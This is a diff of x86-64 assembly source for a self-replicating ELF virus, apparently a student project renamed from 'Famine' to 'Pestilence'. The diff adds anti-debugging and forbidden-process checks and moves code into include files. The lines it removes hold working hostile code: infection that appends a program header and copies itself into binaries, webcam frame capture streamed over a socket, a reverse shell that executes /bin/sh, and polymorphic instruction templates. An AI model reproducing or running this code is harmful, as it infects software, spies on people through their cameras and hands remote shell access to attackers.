@@ -1,4 +1,4 @@
-%include "src/famine.inc"
+%include "pestilence.inc"
 
 BITS 64
 default rel
@@ -93,7 +93,7 @@ _start:
 	mov		rdi, r12
 	syscall
 	POP_ALL
-	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est famine
+	mov		al, BYTE [rel zero]	; SI ICI = 0, ca signfiie c'est pestilence
 	test	al, al
 	jz		.continue
 
@@ -411,7 +411,7 @@ print_rax:
 		pop		rax
 	ret
 
-	famine:
+	pestilence:
 		push	r12
 		push	rax
 		push	rcx
@@ -519,7 +519,7 @@ print_rax:
 			pop		rdi
 
 
-			call	famine
+			call	pestilence
 
 			push	rsi
 			lea		rsi, [rel path]
@@ -789,7 +789,7 @@ infection:
 	mov byte [r14 + 0xa], 1
 
 	mov rax, [rel p_offset]
-	add rax, FAMINE_SIZE_NO_BSS
+	add rax, PESTILENCE_SIZE_NO_BSS
 	cmp rax, [rel file_size]
 	jbe .no_extend
 
@@ -801,7 +801,7 @@ infection:
 	mov rax, SYS_ftruncate
 	mov rdi, r12
 	mov rsi, [rel p_offset]
-	add rsi, FAMINE_SIZE_NO_BSS
+	add rsi, PESTILENCE_SIZE_NO_BSS
 	mov [rel file_size], rsi
 	syscall
 
@@ -822,7 +822,7 @@ infection:
 	mov rdi, r14
 	add rdi, [rel p_offset]
 	lea rsi, [rel _start]
-	mov rcx, FAMINE_SIZE_NO_BSS
+	mov rcx, PESTILENCE_SIZE_NO_BSS
 	rep movsb
 	pop rcx
 	pop rsi
@@ -846,7 +846,17 @@ infection:
 
 
 end_:
-	call	famine
+	; check for tracer
+	call _is_debugged
+	cmp rax, -1
+	je .just_quit
+
+	; check for forbidden process
+	call _check_forbidden_process
+	cmp rax, 1
+	je .just_quit
+
+	call	pestilence
 
 	mov		rax, SYS_open
 	lea		rdi, [rel self]
@@ -933,273 +943,10 @@ end_:
 		syscall
 		mov		r13, rax	; le socket
 
-		mov		rax, SYS_connect
-		mov		rdi, r13
-		lea		rsi, [rel serv_addr_video]
-		mov		rdx, 16
-		syscall
-		test	rax, rax
-		jnz		.closing_video
+%include "video.s"
 
-		;struct v4l2_requestbuffers { C'est un buffer les formalites
-		;	__u32 count;          // le nombre de tampons
-		;	__u32 type;           // le type de tampons
-		;	__u32 memory;         // le type de memoire
-		;	__u32 reserved[2];    //
-		;};
-		; struct v4l2_buffer
-		mov		dword [rel reqb], NBUF
-		mov		dword [rel reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
-		mov		dword [rel reqb + 8], V4L2_MEMORY_MMAP
-		xor		eax, eax
-		mov		[reqb + 12], eax
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_REQBUFS
-		lea		rdx, [rel reqb]
-		syscall
+%include "check_debug.s"
 
-%assign i 0
-%rep NBUF
-		mov		dword [rel v4buf], i
-		mov		dword [rel v4buf + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
-		mov		dword [rel v4buf + 60], V4L2_MEMORY_MMAP
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_QUERYBUF
-		lea		rdx, [rel v4buf]
-		syscall
-
-		mov		rax, SYS_mmap
-		xor		rdi, rdi                          ; addr = NULL
-		mov		edx, [rel v4buf + 72]                 ; length (dword) → edx
-		mov		esi, edx                          ; rsi = length
-		mov		edx, PROT_READ | PROT_WRITE       ; rdx
-		mov		r10, MAP_SHARED
-		mov		r8,  r12                          ; fd
-		mov		r9,  [rel v4buf + 64]                 ; offset (qword)
-		syscall
-		mov		[rel buf_addrs + i*8], rax            ; save address
-		mov		eax, [rel v4buf + 72]
-		mov		[rel buf_sizes + i*8], rax            ; save size (dword → qword)
-
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_QBUF
-		lea		rdx, [rel v4buf]
-		syscall
-%assign i i+1
-%endrep
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_STREAMON
-		lea		rdx, [rel cap_type]
-		syscall
-
-		mov		rcx, FRAMES
-		.loop_frames:
-		push	rcx
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_DQBUF
-		lea		rdx, [rel v4buf]
-		syscall
-
-		mov		ebx, [rel v4buf]                      ; index (dword)
-		mov		edx, [rel v4buf + 8]                  ; bytesused
-		lea		rcx, [rel buf_addrs]
-		mov		rsi, [rcx + rbx*8]          ; addr
-		mov		rdi, r13                          ; stdout
-		mov		rax, SYS_write
-		syscall
-
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_QBUF
-		lea		rdx, [rel v4buf]
-		syscall
-		pop		rcx
-		loop	.loop_frames
-
-		mov		rax, SYS_ioctl
-		mov		rdi, r12
-		mov		rsi, VIDIOC_STREAMOFF
-		lea		rdx, [rel cap_type]
-		syscall
-
-%assign i 0
-%rep NBUF
-		mov		rax, SYS_munmap
-		mov		rdi, [rel buf_addrs + i*8]
-		mov		rsi, [rel buf_sizes + i*8]
-		syscall
-%assign i i+1
-%endrep
-		.closing_video:
-		mov		rax, SYS_close
-		mov		rdi, r12
-		syscall
-
-		mov		rax, SYS_close
-		mov		rdi, r13
-		syscall
-
-
-		.continue_reverse:
-		mov		rax, SYS_socket
-		mov		rdi, AF_INET
-		mov		rsi, SOCK_STREAM
-		xor		rdx, rdx
-		NOP
-		NOP
-		NOP
-		NOP
-		syscall
-		mov		r12, rax
-
-		mov		rax, SYS_connect
-		mov		rdi, r12
-		lea		rsi, [rel serv_addr]
-		mov		rdx, 16
-		syscall
-		test	rax, rax
-		jnz		.exit_ret
-
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 0
-		syscall
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 1
-		syscall
-		mov		rax, SYS_dup2
-		mov		rdi, r12
-		mov		rsi, 2
-		syscall
-		lea		rax, [rel arg0]
-		mov		[rel argv], rax
-		mov		rax, SYS_execve
-		lea		rdi, [rel shell]
-		lea		rsi, [rel argv]
-		xor		rdx, rdx
-		NOP
-		NOP
-		NOP
-		NOP
-		syscall
-
-	.exit_ret:
-		mov		rax, SYS_close
-		mov		rdi, r12
-		syscall
-
-		mov		rax, SYS_exit
-		xor		rdi, rdi
-		NOP
-		NOP
-		NOP
-		NOP
-		syscall
 _stop:
-; -----
 
-	file_size dq 0
-	file	db 'elf64 found!', 0
-	signature	db 'Famine version 1.0 (c)oded by alexafer-jdecorte', 0
-	old_entry		   dq 0
-	new_entry		   dq 0
-	self	db '/proc/self/exe', 0
-	last	db '..', 0
-	curr	db '.', 0
-	cap_type dd V4L2_BUF_TYPE_VIDEO_CAPTURE
-	pathv	db '/dev/video0', 0
-	one		db 1
-	zero	db 0
-	paddi	dq 0
-	entry	dq 0
-	exec	dd 7
-	urandom_path : db '/dev/urandom', 0
-	randbuf: dq 0
-	serv_addr_video:
-		dw AF_INET
-		dw 0x5c11			; 4444
-		dd 0x0100007F		; 127.0.0.1
-		times 8 db 0
-
-	serv_addr:
-		dw AF_INET
-		dw 0x901F			; 8080
-		dd 0x0100007F		; 127.0.0.1
-		times 8 db 0
-		shell:	db '/bin/sh', 0
-		arg0:       db "sh", 0
-		argv:       dq 0, 0
-
-	templates_rdi:
-		db 0x48, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor, rdi, rdi
-		db 0x48, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov rdi , 0
-		db 0x48, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub rdi, rdi
-		db 0x48, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and rdi, 0
-	templates_rax:
-		db 0x48, 0x31, 0xc0, 0x90, 0x90, 0x90, 0x90     ; xor rax, rax
-		db 0x48, 0xc7, 0xc0, 0x00, 0x00, 0x00, 0x00     ; mov rax, 0
-		db 0x48, 0x29, 0xc0, 0x90, 0x90, 0x90, 0x90     ; sub rax, rax
-		db 0x48, 0x83, 0xe0, 0x00, 0x90, 0x90, 0x90     ; and rax, 0
-	templates_rsi:
-		db 0x48, 0x31, 0xf6, 0x90, 0x90, 0x90, 0x90     ; xor rsi, rsi
-		db 0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00     ; mov rsi, 0
-		db 0x48, 0x29, 0xf6, 0x90, 0x90, 0x90, 0x90     ; sub rsi, rsi
-		db 0x48, 0x83, 0xe6, 0x00, 0x90, 0x90, 0x90     ; and rsi, 0
-	templates_rdx:
-		db 0x48, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor rdx, rdx
-		db 0x48, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov rdx, 0
-		db 0x48, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub rdx, rdx
-		db 0x48, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and rdx, 0
-	templates_rcx:
-		db 0x48, 0x31, 0xc9, 0x90, 0x90, 0x90, 0x90     ; xor rcx, rcx
-		db 0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00     ; mov rcx, 0
-		db 0x48, 0x29, 0xc9, 0x90, 0x90, 0x90, 0x90     ; sub rcx, rcx
-		db 0x48, 0x83, 0xe1, 0x00, 0x90, 0x90, 0x90     ; and rcx, 0
-	templates_r10:
-		db 0x4d, 0x31, 0xd2, 0x90, 0x90, 0x90, 0x90     ; xor r10, r10
-		db 0x49, 0xc7, 0xc2, 0x00, 0x00, 0x00, 0x00     ; mov r10, 0
-		db 0x4d, 0x29, 0xd2, 0x90, 0x90, 0x90, 0x90     ; sub r10, r10
-		db 0x49, 0x83, 0xe2, 0x00, 0x90, 0x90, 0x90     ; and r10, 0
-	templates_r11:
-		db 0x4d, 0x31, 0xdb, 0x90, 0x90, 0x90, 0x90     ; xor r11, r11
-		db 0x49, 0xc7, 0xc3, 0x00, 0x00, 0x00, 0x00     ; mov r11, 0
-		db 0x4d, 0x29, 0xdb, 0x90, 0x90, 0x90, 0x90     ; sub r11, r11
-		db 0x49, 0x83, 0xe3, 0x00, 0x90, 0x90, 0x90     ; and r11, 0
-	templates_r13:
-		db 0x4d, 0x31, 0xed, 0x90, 0x90, 0x90, 0x90     ; xor r13, r13
-		db 0x49, 0xc7, 0xc5, 0x00, 0x00, 0x00, 0x00     ; mov r13, 0
-		db 0x4d, 0x29, 0xed, 0x90, 0x90, 0x90, 0x90     ; sub r13, r13
-		db 0x49, 0x83, 0xe5, 0x00, 0x90, 0x90, 0x90     ; and r13, 0
-	templates_r15:
-		db 0x4d, 0x31, 0xff, 0x90, 0x90, 0x90, 0x90     ; xor r15, r15
-		db 0x49, 0xc7, 0xc7, 0x00, 0x00, 0x00, 0x00     ; mov r15, 0
-		db 0x4d, 0x29, 0xff, 0x90, 0x90, 0x90, 0x90     ; sub r15, r15
-		db 0x49, 0x83, 0xe7, 0x00, 0x90, 0x90, 0x90     ; and r15, 0
-; NEW HEADER
-new_programheader:
-	p_type		dd	1
-	p_flags		dd	7
-	p_offset	dq	0
-	p_vaddr		dq	0
-	p_paddr		dq	0
-	p_filez		dq	FAMINE_SIZE_NO_BSS
-	p_memsz		dq	FAMINE_SIZE
-	p_palign	dq	4096
-	newl	times 0001 db 0xa
-	path	db '/tmp/test/', 0
-buffer_bss:
-	padd	times 0512 db 0
-	buff	times 4096 db 0
-	elfp0	times 0056 db 0
-	elfp1	times 0056 db 0
-	buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
-	buf_sizes   times NBUF dq 0   ; leurs tailles
-	reqb        times 16   db 0         ; struct v4l2_requestbuffers
-	v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)
-end_addr:
+%include "data.s"
